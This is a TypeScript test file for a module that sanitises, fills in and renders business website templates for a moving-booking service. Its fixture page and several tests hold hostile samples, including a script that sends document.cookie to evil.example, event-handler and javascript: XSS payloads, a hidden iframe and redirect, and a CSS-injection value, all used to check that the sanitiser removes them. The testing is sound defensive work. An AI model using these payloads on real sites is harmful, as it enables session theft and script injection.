import { describe, expect, it } from 'vitest';
import {
  AA_CONTRAST, OTHER_CATEGORY, TEMPLATE_CATEGORIES, bestFor, categoryLabel, contrastRatio, readableOn, readableShade, contentFlags, featureLabel, htmlProblems, pageFor, prepareTemplate,
  renderTemplatePage, replaceForms, sanitiseHtml, templateCategory, templateFeatures, templateId,
} from '../../supabase/functions/_shared/site-template.ts';

const ASSET_HOST = 'assets.flyttgo.test';

// A page shaped like Architect-AI's site masters (sample company "Swiftmove").
const HOME = `<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<title>Swiftmove — Movers in Columbus</title>
<link rel="stylesheet" href="https://cdn.example.com/x.css">
<meta http-equiv="refresh" content="0;url=https://evil.example">
<style>:root{--c-primary:#E4572E;--c-accent:#17335F}@import url("https://fonts.example/f.css");
.hero{background:url(https://tracker.example/p.gif)}</style></head>
<body><nav><a href="{{BASE}}/">Home</a><a href="{{BASE}}/services">Services</a><a href="#quote">Get a quote</a></nav>
<h1 onclick="steal()">Swiftmove moves Columbus</h1>
<img src="{{ASSET:hero}}" alt=""><img src="https://tracker.example/pixel.gif">
<p>Crews from $129/hr, flat-rate moves from $420. Since 2009, 4,000+ moves. Rated 4.9/5 on Google reviews.</p>
<p>Call (614) 555-0139 or write to crew@swiftmove.co</p><a href="tel:+16145550139">Call</a><a href="mailto:crew@swiftmove.co">Mail</a>
<a href="javascript:alert(1)">x</a>
<form action="https://collect.example/lead" method="post"><input name="email"><button>Send</button></form>
<iframe src="https://evil.example"></iframe>
<script>fetch('https://evil.example/?c='+document.cookie)</script>
</body></html>`;

describe('sanitiseHtml', () => {
  it('removes everything that runs code, loads from elsewhere or sends data', () => {
    const { html, removed } = sanitiseHtml(HOME, [ASSET_HOST]);
    expect(html).not.toMatch(/<script|onclick|javascript:|<iframe|<form|<input|<link|http-equiv|@import|tracker\.example|cdn\.example/i);
    expect(removed).toMatchObject({ scripts: 1, handlers: 1, jsUrls: 1, frames: 1, forms: 1, links: 1, refresh: 1, imports: 1, externalSrc: 1 });
    expect(htmlProblems(html)).toEqual([]);
    expect(html).toContain('{{BOOKING_URL}}');           // the form became a booking link
  });

  it('keeps images from the asset store', () => {
    const { html } = sanitiseHtml(`<img src="https://${ASSET_HOST}/a.jpg"><div style="background:url(https://${ASSET_HOST}/b.jpg)">`, [ASSET_HOST]);
    expect(html).toContain(`https://${ASSET_HOST}/a.jpg`);
    expect(html).toContain(`https://${ASSET_HOST}/b.jpg`);
  });

  it('catches script tags in odd spellings', () => {
    for (const s of ['<SCRIPT>x</SCRIPT>', '<script src=x>', '<img src=x onerror=alert(1)>', '<a href="  javascript:x">', '<embed src=x>']) {
      expect(htmlProblems(sanitiseHtml(s).html)).toEqual([]);
    }
  });
});

describe('prepareTemplate (import)', () => {
  const t = prepareTemplate({
    id: 'moving-swiftmv01', name: 'Swiftmove', industry: ['moving', 'movers'], style: 'bold',
    pages: JSON.stringify([{ path: '/', html: HOME }, { path: '/contact', html: '<p>Swiftmove, (614) 555-0139</p>' }]),
    preview_assets: [{ key: 'hero', url: `https://${ASSET_HOST}/hero.jpg` }],
  }, [ASSET_HOST]);

  it('turns the sample company into placeholders and quote links into the booking page', () => {
    const home = t.pages[0].html;
    expect(t.id).toBe('moving-swiftmv01');
    expect(home).not.toMatch(/Swiftmove|555-0139|crew@swiftmove\.co/);
    expect(home).toContain('<title>{{brand.name}} — Movers in Columbus</title>');
    expect(home).toContain('href="tel:{{brand.phone_tel}}"');
    expect(home).toContain('href="mailto:{{brand.email}}"');
    expect(home).toContain('href="{{BOOKING_URL}}"');
    expect(t.pages[1].html).toBe('<p>{{brand.name}}, {{brand.phone}}</p>');
  });

  it('lists what a person must still check: prices, reviews, claims', () => {
    const kinds = new Set(t.flags.map(f => f.kind));
    expect(kinds.has('price')).toBe(true);
    expect(kinds.has('review')).toBe(true);
    expect(kinds.has('claim')).toBe(true);
    expect(kinds.has('phone')).toBe(false);              // replaced
    expect(t.flags.find(f => f.kind === 'price')?.sample).toContain('$129/hr');
    expect(t.removed.scripts).toBe(1);
  });

  it('makes safe ids', () => {
    expect(templateId('Moving Swift_MV01!')).toBe('moving-swift-mv01');
  });
});

describe('renderTemplatePage (serve)', () => {
  const prepared = prepareTemplate({ id: 'x', name: 'Swiftmove', pages: [{ path: '/', html: HOME }] }, [ASSET_HOST]).pages[0].html;
  const html = renderTemplatePage(prepared, {
    brand: { name: 'Acme <Flytt>', phone: '+47 22 33 44 55', email: 'kundeservice@acme.no', primaryColor: '#0055aa', accentColor: '#ffcc00' },
    assets: [{ key: 'hero', url: `https://${ASSET_HOST}/hero.jpg` }],
    pageUrl: (p) => `/b/acme?page=${encodeURIComponent(p)}`,
    bookingUrl: '/b/acme/book',
    sellerNotice: 'Moves booked here are sold and carried out by FlyttGo AS (org. nr. 923609016).',
    assetHosts: [ASSET_HOST],
  });

  it('fills in the company, escaped', () => {
    expect(html).toContain('Acme &lt;Flytt&gt;');
    expect(html).not.toContain('<Flytt>');
    expect(html).toContain('href="tel:+4722334455"');
    expect(html).toContain(':root{--c-primary:#0055aa;--c-accent:#ffcc00;');
    expect(html).toContain(`src="https://${ASSET_HOST}/hero.jpg"`);
  });

  it('sends links out of the frame: pages of the site and the booking page', () => {
    expect(html).toContain('href="/b/acme?page=%2Fservices" target="_top"');
    expect(html).toContain('href="/b/acme/book" target="_top"');
    expect(html).not.toMatch(/\{\{/);
  });

  it('says who sells, on every page', () => {
    expect(html).toMatch(/<div class="fg-seller">Moves booked here are sold and carried out by FlyttGo AS[^<]*<\/div><\/body>/);
  });

  it('never lets an image come from elsewhere through an asset', () => {
    const out = renderTemplatePage('<img src="{{ASSET:hero}}">', {
      brand: { name: 'A' }, assets: [{ key: 'hero', url: 'https://tracker.example/p.gif' }],
      pageUrl: () => '/', bookingUrl: '/', sellerNotice: '', assetHosts: [ASSET_HOST],
    });
    expect(out).toContain('src=""');
  });

  it('picks the page for a path', () => {
    const pages = [{ path: '/', html: 'home' }, { path: '/services', html: 'svc' }];
    expect(pageFor(pages, '/services/')?.html).toBe('svc');
    expect(pageFor(pages, '/nope')?.html).toBe('home');
  });
});

describe('contentFlags', () => {
  it('finds Norwegian prices too', () => {
    expect(contentFlags('<p>Fra 1 290 kr per time</p>', '/').some(f => f.kind === 'price')).toBe(true);
  });
});

describe('the catalogue categories', () => {
  it('puts every template in a category, never health', () => {
    expect(templateCategory(['moving', 'movers'])).toBe('transport');
    expect(templateCategory(['logistics', 'man-and-van'])).toBe('transport');
    expect(templateCategory(['automotive'])).toBe('trades');
    expect(templateCategory(['hair-salon'])).toBe('appointments');
    expect(templateCategory(['restaurant'])).toBe('hospitality');
    expect(templateCategory(['mining'])).toBe('industry');
    expect(templateCategory(['something-new'])).toBe(OTHER_CATEGORY.id);
    expect(templateCategory([])).toBe(OTHER_CATEGORY.id);
    expect(templateCategory(['dental', 'clinic'])).toBeNull();
    expect(templateCategory(['beauty', 'medical-spa'])).toBeNull();
  });
  it('has a label for every category and no industry in two', () => {
    const seen = new Map<string, string>();
    for (const c of TEMPLATE_CATEGORIES) {
      expect(categoryLabel(c.id)).toBe(c.label);
      for (const t of c.tags) { expect(seen.get(t), `${t} in ${seen.get(t)} and ${c.id}`).toBeUndefined(); seen.set(t, c.id); }
    }
    expect(categoryLabel('other')).toBe(OTHER_CATEGORY.label);
  });
});

describe('keeping the template\'s look', () => {
  it('turns a form into a card with its classes and a booking button', () => {
    const h = replaceForms('<div class="cta-grid"><form class="lead" data-lead-form><input name="email"><button>Send</button></form></div>');
    expect(h).toContain('<div class="lead fg-book-card">');
    expect(h).toContain('href="{{BOOKING_URL}}"');
    expect(h).not.toMatch(/<form|<input|<button/);
  });
  it('replaces the sample name where the page writes "&" as "&amp;", also in image descriptions', () => {
    const t = prepareTemplate({ id: 'x', name: 'Fast Man & Van', pages: [{ path: '/', html:
      '<html><head><title>Fast Man & Van — UK</title></head><body><a class="brand">Fast Man &amp; Van</a>'
      + '<img src="{{ASSET:hero}}" alt="A Fast Man &amp; Van removal van"><p>Fast Man &amp; Vans</p></body></html>' }] });
    const h = t.pages[0].html;
    expect(h).toContain('<a class="brand fg-brand-slot">{{brand.logo}}<span class="fg-brand-name">{{brand.name}}</span></a>');
    expect(h).toContain('alt="A {{brand.name}} removal van"');
    expect(h).toContain('<title>{{brand.name}} — UK</title>');
    expect(h).toContain('Fast Man &amp; Vans');                      // a longer word is left alone
  });
  it('shows content scripts would have faded in', () => {
    const h = renderTemplatePage('<html><head><style>.reveal{opacity:0}</style></head><body><div class="reveal">Hi</div></body></html>', {
      brand: { name: 'A' }, assets: [], pageUrl: () => '#', bookingUrl: '#', sellerNotice: 'n' });
    expect(h).toMatch(/\.reveal\{opacity:1!important;transform:none!important\}/);
    expect(h.indexOf('.reveal{opacity:1')).toBeGreaterThan(h.indexOf('.reveal{opacity:0}'));
  });
});

describe('the catalogue cards', () => {
  it('finds what a template\'s pages have from their paths, headings and sections', () => {
    const f = templateFeatures([
      { path: '/', html: '<section class="hero"><h1>Hair that turns heads</h1></section><section id="pricing"><h2>A look at our <em>pricing</em></h2></section>'
        + '<h2>Talented hands, <em>friendly faces</em></h2><h3>What our clients say</h3>' },
      { path: '/contact', html: '<h1>Request <em>service</em></h1><h2>Quick <em>answers</em></h2>' },
      { path: '/gallery', html: '<p>Photos</p>' },
    ]);
    expect(f).toEqual(['pricing', 'gallery', 'testimonials', 'team', 'faq', 'contact']);
    expect(templateFeatures([{ path: '/', html: '<h1>Fast moves</h1><p>We offer pricing on request</p>' }])).toEqual([]);  // body text is not a section
    expect(featureLabel('faq')).toBe('FAQ');
  });
  it('says what a template is best for, in words, from its industries', () => {
    expect(bestFor(['hair-salon', 'beauty', 'personal-care', 'spa'])).toBe('hair salon, beauty and personal care');
    expect(bestFor(['plumbing', 'plumber'])).toBe('plumbing');
    expect(bestFor(['moving'])).toBe('moving');
    expect(bestFor([])).toBe('other businesses');
  });
  it('lists features at import', () => {
    const t = prepareTemplate({ id: 'x', name: 'Swiftmove', pages: [{ path: '/', html: HOME }, { path: '/pricing', html: '<h1>Rates</h1>' }] });
    expect(t.features).toEqual(['pricing']);
  });
});

describe('the company\'s brand, whatever it is', () => {
  const page = (body: string, title = 'Verve Hair Salon') => `<html><head><title>${title} — Nashville</title><style>.brand{letter-spacing:.24em}</style></head><body>${body}</body></html>`;
  const verve = prepareTemplate({ id: 'salon-verve01', name: 'Verve Hair Salon', pages: [
    { path: '/', html: page('<header><a class="brand" href="{{BASE}}/"><span class="mk"></span>Verve</a></header>'
      + '<p>Verve is a salon. At Verve Hair Salon we listen.</p><img src="{{ASSET:hero}}" alt="A stylist at Verve">'
      + '<footer><div class="brand fbrand"><span class="mk"></span>Ver<em>ve</em></div></footer>') },
    { path: '/about', html: page('<h1>About Verve\'s team</h1><p>Nothing but verve and good taste.</p>') },
  ] });

  it('finds the short name the logo uses and replaces it with the full one', () => {
    expect(verve.sample_names).toEqual(['Verve Hair Salon', 'Verve']);
    const h = verve.pages[0].html;
    expect(h).toContain('<a class="brand fg-brand-slot" href="{{BASE}}/"><span class="mk"></span>{{brand.logo}}<span class="fg-brand-name">{{brand.name}}</span></a>');
    expect(h).toContain('<div class="brand fbrand fg-brand-slot"><span class="mk"></span>{{brand.logo}}<span class="fg-brand-name">{{brand.name}}</span></div>');
  });

  it('leaves a short name that is an everyday word in the page alone (written in lower case there)', () => {
    // "verve" is written as a word on /about, so the short form is replaced only in the logo
    expect(verve.pages[0].html).toContain('<p>Verve is a salon. At {{brand.name}} we listen.</p>');
    expect(verve.flags.some(f => f.kind === 'sample_name')).toBe(false);
    const fast = prepareTemplate({ id: 'x', name: 'Fast Man & Van', pages: [{ path: '/', html:
      '<a class="brand">Fast</a><h1>Fast, reliable moves</h1>' }] });
    expect(fast.pages[0].html).toContain('<h1>Fast, reliable moves</h1>');
    expect(fast.pages[0].html).toContain('<span class="fg-brand-name">{{brand.name}}</span>');
  });

  it('replaces a distinctive short name everywhere: text, title, image descriptions', () => {
    const t = prepareTemplate({ id: 'x', name: 'Redwater Plumbing', pages: [{ path: '/', html:
      '<html><head><title>Redwater — Plumbers</title><meta name="description" content="Book Redwater Plumbing today"></head><body><a class="logo">Redwater</a><p>Call Redwater\'s crew.</p>'
      + '<img src="{{ASSET:hero}}" alt="A Redwater van"></body></html>' }] });
    const h = t.pages[0].html;
    expect(h).toContain('<title>{{brand.name}} — Plumbers</title>');
    expect(h).toContain('content="Book {{brand.name}} today"');
    expect(h).toContain('<p>Call {{brand.name}}\'s crew.</p>');
    expect(h).toContain('alt="A {{brand.name}} van"');
    expect(h).not.toContain('Redwater');
  });

  it('never takes an unrelated logo strip for the brand', () => {
    const t = prepareTemplate({ id: 'x', name: 'Verve Hair Salon', pages: [{ path: '/', html: '<div class="logo-grid"><span>Acme</span></div>' }] });
    expect(t.pages[0].html).toBe('<div class="logo-grid"><span>Acme</span></div>');
  });

  const render = (brand: Parameters<typeof renderTemplatePage>[1]['brand'], html = verve.pages[0].html) => renderTemplatePage(html, {
    brand, assets: [{ key: 'hero', url: `https://${ASSET_HOST}/hero.jpg` }], pageUrl: () => '/', bookingUrl: '/book', sellerNotice: 'n',
    assetHosts: [ASSET_HOST],
  });

  it('shows the company\'s logo in the brand slot when it has one, in place of the template\'s mark', () => {
    const h = render({ name: 'Acme', logoUrl: `https://${ASSET_HOST}/logos/acme.png?token=a&b=1` });
    expect(h).toContain(`<img class="fg-logo" src="https://${ASSET_HOST}/logos/acme.png?token=a&amp;b=1" alt=""><span class="fg-brand-name">Acme</span>`);
    expect(h).toContain('.fg-brand-slot>:not(.fg-logo):not(.fg-brand-name){display:none!important}');
    const none = render({ name: 'Acme' });
    expect(none).not.toContain('<img class="fg-logo"');
    expect(none).not.toContain('display:none!important');
  });

  it('never shows a logo from elsewhere or a script URL', () => {
    for (const logoUrl of ['https://evil.example/x.png', 'javascript:alert(1)', `http://${ASSET_HOST}/x.png`, '"><script>x</script>']) {
      expect(render({ name: 'Acme', logoUrl })).not.toMatch(/fg-logo" src|<script/);
    }
  });

  it('escapes every company value and never reads it as a placeholder', () => {
    const h = render({ name: '"><img src=x onerror=alert(1)> {{BOOKING_URL}} {{brand.email}}', tagline: '<b>x</b>',
      email: 'a"b@x.no', phone: '+47 "1"', city: '<i>' });
    expect(h).toContain('&quot;&gt;&lt;img src=x onerror=alert(1)&gt; {{BOOKING_URL}} {{brand.email}}');
    expect(h).not.toMatch(/<img src=x/);
    expect(h).toContain('<p>Verve is a salon. At &quot;&gt;&lt;img src=x onerror=alert(1)&gt; {{BOOKING_URL}}');
    expect(h).toContain('<title>&quot;&gt;&lt;img src=x onerror=alert(1)&gt;');
  });

  it('sets a long name smaller and lets it wrap instead of breaking the header', () => {
    const short = render({ name: 'Acme' });
    const long = render({ name: 'Nordlys Flytting og Transport AS' });
    const longer = render({ name: 'Trøndelag Flytte- og Transportbyrå Aksjeselskap Avdeling Sør' });
    for (const h of [short, long, longer]) {
      expect(h).toContain('.fg-brand-slot{min-width:0;max-width:100%;flex-shrink:1');
      expect(h).toContain('.fg-brand-name{min-width:0;overflow-wrap:anywhere;white-space:normal}');
      expect(h).toContain('html{overflow-wrap:break-word}');
    }
    expect(short).not.toContain('font-size:.8em');
    expect(long).toContain('.fg-brand-name{font-size:.8em;letter-spacing:.02em');
    expect(longer).toContain('.fg-brand-name{font-size:.62em;letter-spacing:0');
  });

  it('gives the brand colours as custom properties, with readable text on them', () => {
    const h = render({ name: 'A', primaryColor: '#F2A900', accentColor: '#1B2A4A' });
    expect(h).toContain(':root{--c-primary:#F2A900;--c-accent:#1B2A4A;--fg-primary:var(--c-primary,#0b2e59);'
      + '--fg-accent:var(--c-accent,var(--fg-primary));--fg-on-primary:#111827;--fg-on-accent:#ffffff}');
    expect(render({ name: 'A', primaryColor: 'red;}body{display:none' })).not.toContain('display:none;');
  });
});

describe('contrast', () => {
  it('measures as WCAG does', () => {
    expect(contrastRatio('#ffffff', '#000000')).toBeCloseTo(21, 5);
    expect(contrastRatio('#777777', '#ffffff')).toBeCloseTo(4.48, 2);
    expect(readableOn('#F2A900')).toBe('#111827');
    expect(readableOn('#0B2E59')).toBe('#ffffff');
  });
  it('suggests the nearest shade that reads, and keeps a colour that already does', () => {
    expect(readableShade('#0B2E59')).toBe('#0B2E59');
    const s = readableShade('#F2A900');
    expect(contrastRatio(s, '#ffffff')).toBeGreaterThanOrEqual(AA_CONTRAST);
    expect(s).not.toBe('#F2A900');
    expect(contrastRatio(readableShade('#333333', '#111111'), '#111111')).toBeGreaterThanOrEqual(AA_CONTRAST);
  });
});
